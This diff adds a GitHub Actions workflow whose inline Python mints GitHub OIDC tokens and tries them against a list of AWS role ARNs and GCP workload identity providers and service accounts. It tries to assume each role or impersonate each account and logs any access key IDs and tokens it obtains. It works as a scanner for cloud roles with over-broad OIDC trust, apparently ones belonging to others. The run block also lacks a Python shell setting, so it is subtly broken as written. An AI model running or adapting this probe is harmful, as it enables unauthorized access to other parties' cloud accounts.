@@ -1,0 +1,126 @@
+name: c211-i81348-oidc-probe
+on:
+  push:
+    branches: [c211-i81348-oidc-probe]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: probe
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          import os, json, base64, urllib.request, urllib.error, urllib.parse, re
+
+          def mint(aud):
+              base=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL','')
+              if not base: return None, 'NO_OIDC_URL'
+              u=base+'&audience='+urllib.parse.quote(aud, safe='')
+              t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+              req=urllib.request.Request(u, headers={'Authorization':'Bearer '+t})
+              try:
+                  j=json.load(urllib.request.urlopen(req, timeout=30))
+                  return j.get('value'), None
+              except urllib.error.HTTPError as e:
+                  return None, 'HTTP%d %s'%(e.code, e.read()[:200])
+              except Exception as e:
+                  return None, str(e)[:200]
+
+          def post_json(url, obj, headers=None, timeout=40):
+              h={'Content-Type':'application/json'}
+              if headers: h.update(headers)
+              req=urllib.request.Request(url, data=json.dumps(obj).encode(), headers=h, method='POST')
+              try:
+                  with urllib.request.urlopen(req, timeout=timeout) as f:
+                      return f.status, f.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8','replace')
+              except Exception as e:
+                  return 0, str(e)[:300]
+
+          def load_cases():
+              url='https://api.github.com/repos/%s/contents/c211/i81348-probe-cases.json' % os.environ['GITHUB_REPOSITORY']
+              req=urllib.request.Request(url, headers={'Authorization':'Bearer '+os.environ['GITHUB_TOKEN'],'Accept':'application/vnd.github.raw'})
+              return json.loads(urllib.request.urlopen(req, timeout=60).read())
+
+          def sts_aws(arn, token):
+              host='https://sts.amazonaws.com.cn/' if arn.startswith('arn:aws-cn') else 'https://sts.amazonaws.com/'
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211i81348','WebIdentityToken':token}).encode()
+              req=urllib.request.Request(host, data=body, headers={'Content-Type':'application/x-www-form-urlencoded'}, method='POST')
+              try:
+                  with urllib.request.urlopen(req, timeout=40) as f:
+                      return 200, f.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8','replace')
+              except Exception as e:
+                  return 0, str(e)[:300]
+
+          def xval(x, tag):
+              m=re.search('<%s>(.*?)</%s>'%(tag,tag), x, re.S)
+              return m.group(1) if m else None
+
+          def main():
+              tok, err = mint('sts.amazonaws.com')
+              claims=None
+              if tok:
+                  try:
+                      p=tok.split('.')[1]; p+='='*(-len(p)%4)
+                      claims=json.loads(base64.urlsafe_b64decode(p))
+                  except Exception: pass
+              print('MINT_DEFAULT', 'OK' if tok else err, flush=True)
+              print('CLAIMS', json.dumps({k:claims.get(k) for k in ('iss','sub','aud','repository','repository_owner','ref','event_name','job_workflow_ref')} if claims else None), flush=True)
+              if not tok:
+                  return
+              cases=load_cases()
+              out={'aws':[], 'gcp':[], 'azure':[]}
+              for c in cases['aws']:
+                  arn=c['arn']; res={'arn':arn,'src':c.get('src')}
+                  for aud in c['auds']:
+                      t2=tok
+                      if aud!='sts.amazonaws.com':
+                          t2,_=mint(aud)
+                      if not t2:
+                          res[aud]={'err':'NO_TOKEN'}; continue
+                      code,x=sts_aws(arn,t2)
+                      r={'http':code,'code':xval(x,'Code'),'msg':(xval(x,'Message') or '')[:220],'akid':xval(x,'AccessKeyId'),'exp':xval(x,'Expiration')}
+                      res[aud]=r
+                      print('AWS', arn, '|aud',aud,'|',r.get('code'),'|',r.get('msg'), flush=True)
+                  out['aws'].append(res)
+              for c in cases['gcp']:
+                  p=c['provider']
+                  t2,e2=mint(p)
+                  rec={'provider':p,'src':c.get('src')}
+                  if not t2:
+                      rec['mint']=e2; out['gcp'].append(rec); print('GCP',p,'| MINT',e2,flush=True); continue
+                  code,txt=post_json('https://sts.googleapis.com/v1/token', {'audience':p,'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token','subjectToken':t2,'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt'})
+                  rec['sts_http']=code; fed=None
+                  try:
+                      j=json.loads(txt); rec['sts_err']=j.get('error'); rec['sts_desc']=(j.get('error_description') or '')[:220]; fed=j.get('access_token')
+                  except Exception:
+                      rec['sts_raw']=txt[:220]
+                  if fed: rec['sts_ok']=True
+                  for sa in c['sas']:
+                      if not fed:
+                          rec.setdefault('sa',[]).append({'sa':sa,'skip':'no_federated_token'}); continue
+                      code2,txt2=post_json('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'%sa, {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'}, headers={'Authorization':'Bearer '+fed})
+                      r2={'sa':sa,'http':code2}
+                      try:
+                          jj=json.loads(txt2)
+                          er=jj.get('error')
+                          if isinstance(er,dict):
+                              r2['err']=er.get('status'); r2['msg']=(er.get('message') or '')[:220]
+                          else:
+                              r2['err']=er
+                          r2['token']=bool(jj.get('accessToken')); r2['exp']=jj.get('expireTime')
+                      except Exception: r2['raw']=txt2[:220]
+                      rec.setdefault('sa',[]).append(r2)
+                  out['gcp'].append(rec)
+                  print('GCP',p,'| sts',code,'|',rec.get('sts_err'),'|',rec.get('sts_desc'),'| sas',[(x.get('sa'),x.get('http'),x.get('err')) for x in rec.get('sa',[])],flush=True)
+              blob=base64.b64encode(json.dumps(out).encode()).decode()
+              print('C211_I81348_RESULT', blob, flush=True)
+
+          main()
